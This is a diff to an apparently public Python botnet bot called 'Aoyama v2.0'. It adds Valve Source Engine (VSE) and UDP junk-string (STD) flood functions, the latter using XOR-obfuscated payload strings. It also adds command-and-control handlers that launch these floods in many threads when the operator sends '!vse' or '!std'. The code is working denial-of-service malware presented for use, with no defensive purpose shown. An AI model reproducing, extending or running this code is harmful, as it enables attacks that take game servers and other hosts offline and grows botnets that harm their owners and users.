@@ -1,10 +1,14 @@
 #!/usr/bin/env python3
-#Code By Leeon123
+#Code By Leeon123 / https://github.com/Leeon123
+#And Nexus / https://github.com/Nexuzzzz
+
 ###################################################
 # This is a new version of python3-botnet project #
 #      Added new stuff like daemon, slowloris...  #
 #              Good Luck have Fun                 #
 ###################################################
+
+############################
 #--  Aoyama version v2.0 --#
 # Improved cnc and bot     #
 # Added Port Scanner       #
@@ -66,9 +70,11 @@ acceptall = [
 		"Accept-Language: en-US,en;q=0.5\r\n",
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
+
 strings = "asdfghlqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM1234567890"
 stop    = False#threads control
 scan    = True#Default turn the scanner on
+
 def HTTP(ip, port, path):
 	global stop
 	while True:
@@ -169,6 +175,48 @@ def UDP(ip, port, size):#udp flood(best size is 512-1024, if size too big router
 		except:
 			s.close()
 
+def VSE(ip, port):#VSE flood, for Valve servers
+	global stop
+	while True:
+		if stop :
+			break
+		sendip=(str(ip),int(port))
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		try:
+			for _ in range(200):
+				s.sendto('\xFF\xFF\xFF\xFFTSource Engine Query\x00'.encode(), sendip)
+				
+			s.close()
+		except:
+			s.close()
+
+def STD(ip, port):#STD flood, UDP flood with randomized junk strings
+	global stop
+	while True:
+		if stop :
+			break
+		sendip=(str(ip),int(port))
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		junk_strings = [ #random junk strings used for the STD attacks, feel free to add/delete some
+			xor_dec('IBwdBwoJSgkDGwcQDVU=', key),
+			xor_dec('LBIAA0cKE0siChEAClRURT8dBhkMX19f', key),
+			xor_dec('BgEBAxMSSh8DTyglLQNBRU9L', key),
+			xor_dec('CQcQFhRSRUQLBh0dDBZcBhwVTDgHFhgWEw8D', key),
+			xor_dec('CFMDCRNIAg4AAwhVGxsdERYKEA==', key),
+			xor_dec('MicgRgEEBQQITwsUGw1TRFI=', key),
+			xor_dec('CRIMB0cKCwUIGAABEVQVClMaEQQQHB8eGwcLBhQTARYUFRoY', key),
+			xor_dec('JTcLNUcJHh8NDAJU', key),
+			xor_dec('IBwdBwoJSgkDGwcQDVQAChATEFc=', key)
+                ]
+		
+		try:
+			for _ in range(200):
+				s.sendto(random.choice(junk_strings).encode(), sendip)
+				
+			s.close()
+		except:
+			s.close()
+
 def send_back(ip):
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -244,6 +292,24 @@ def handle(sock):
 					stop = False
 					for _ in range(int(command[3])):
 						p = threading.Thread(target=UDP, args =(command[1],command[2],command[4]))
+						p.start()
+					attack+=1
+				elif command[0] == xor_dec('QAUXAw==',key):#encoded keyword: !vse
+					if attack != 0:
+						stop = True
+						attack=0
+					stop = False
+					for _ in range(int(command[3])):
+						p = threading.Thread(target=VSE, args =(command[1],command[2]))
+						p.start()
+					attack+=1
+			        elif command[0] == xor_dec('QAAQAg==',key):#encoded keyword: !std
+					if attack != 0:
+						stop = True
+						attack=0
+					stop = False
+					for _ in range(int(command[3])):
+						p = threading.Thread(target=STD, args =(command[1],command[2]))
 						p.start()
 					attack+=1
 				elif command[0] == xor_dec('QAAHBwk=',key):
